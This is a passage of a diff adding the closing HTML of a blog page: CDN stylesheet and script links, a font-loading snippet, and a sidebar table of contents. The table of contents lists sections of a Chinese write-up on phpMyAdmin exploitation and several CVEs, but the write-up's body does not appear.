+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#获取版本信息">获取版本信息</a></li>
+    <li><a href="#phpmyadmin权限">phpMyAdmin权限</a></li>
+    <li><a href="#获取网站绝对路径">获取网站绝对路径</a></li>
+    <li><a href="#利用">利用</a></li>
+    <li><a href="#其他漏洞">其他漏洞</a>
+      <ol>
+        <li><a href="#wooyun-2016-199433">WooYun-2016-199433</a></li>
+        <li><a href="#cve-2014-8959">CVE-2014-8959</a></li>
+        <li><a href="#cve-2016-5734">CVE-2016-5734</a></li>
+        <li><a href="#cve-2018-12613">CVE-2018-12613</a></li>
+        <li><a href="#cve-2018-19968">CVE-2018-19968</a></li>
+        <li><a href="#cve-2020-0554">CVE-2020-0554</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
